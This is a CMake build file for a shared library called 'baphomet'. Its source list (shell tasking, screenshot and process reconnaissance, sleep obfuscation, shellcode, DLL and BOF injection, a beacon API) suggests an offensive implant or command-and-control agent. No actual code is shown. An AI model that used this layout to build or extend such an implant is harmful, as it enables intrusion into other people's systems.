cmake_minimum_required(VERSION 3.28)
project(baphomet)

set(CMAKE_CXX_STANDARD 17)

add_library(baphomet SHARED main.cpp
        main.hpp
        networking/send.cpp
        networking/send.hpp
        util/structs.hpp
        util/function_ptrs.hpp
        util/common.hpp
        networking/init.cpp
        networking/init.hpp
        networking/recieve.cpp
        networking/recieve.hpp
        obfuscation/sleep.cpp
        obfuscation/sleep.hpp
        tasking/basic/filesystem.cpp
        tasking/basic/filesystem.hpp
        util/io.cpp
        util/io.hpp
        tasking/basic/shell.cpp
        tasking/basic/shell.hpp
        reconaissance/screenshot.cpp
        reconaissance/screenshot.hpp
        reconaissance/basic.cpp
        reconaissance/basic.hpp
        reconaissance/procenum.cpp
        reconaissance/procenum.hpp
        tasking/injection/shellcode.cpp
        tasking/injection/runexe.cpp
        tasking/injection/injection.hpp
        tasking/injection/rundll.cpp
        tasking/misc.cpp
        tasking/misc.hpp
        tasking/injection/runbof.cpp
        tasking/injection/beacon_api.cpp
        tasking/injection/beacon_api.hpp
)
